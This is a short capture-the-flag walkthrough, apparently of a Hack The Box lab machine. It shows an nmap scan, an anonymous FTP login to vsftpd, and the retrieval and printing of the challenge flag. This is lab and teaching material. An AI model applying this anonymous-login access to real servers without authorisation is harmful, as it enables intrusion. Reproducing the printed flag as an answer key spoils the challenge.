With the given IP

10.129.81.157

What I'll do first is to scan it with nmap to see what ports are open and what services are running.

```bash
nmap -sV 10.129.81.157
```

And we got the following response.

```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-30 21:16 -03
Nmap scan report for 10.129.81.157 (10.129.81.157)
Host is up (0.20s latency).
Not shown: 992 closed ports
PORT      STATE    SERVICE        VERSION
21/tcp    open     ftp            vsftpd 3.0.3
82/tcp    filtered xfer
900/tcp   filtered omginitialrefs
1165/tcp  filtered qsm-gui
2161/tcp  filtered apc-agent
5510/tcp  filtered secureidprop
8009/tcp  filtered ajp13
10616/tcp filtered unknown
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.94 seconds
```

With this information we know that ftp is open, so we can try to connect to it.

But how? if we search about how to log in via ftp there is a way with `anonymous` user.

```bash
ftp <IP>
```

https://stackoverflow.com/questions/3936911/how-can-i-login-anonymously-with-ftp-usr-bin-ftp

user: `anonymous`
password: `anonymous`

```bash
ftp 10.129.81.157              
Connected to 10.129.81.157.
220 (vsFTPd 3.0.3)
Name (10.129.81.157:dyallo): anonymous  
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Here we get the flag file

```bash
ftp> ls
229 Entering Extended Passive Mode (|||6747|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||35034|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |***************************************************************************************************************************************|    32      121.59 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:02 (0.01 KiB/s)
ftp>
```

Then we do a CAT to see the content of the file

```bash
cat flag.txt
```

Output:

```
035db21c881520061c53e0536e44f815
```

And we got the flag.

https://www.hackthebox.com/achievement/machine/834305/393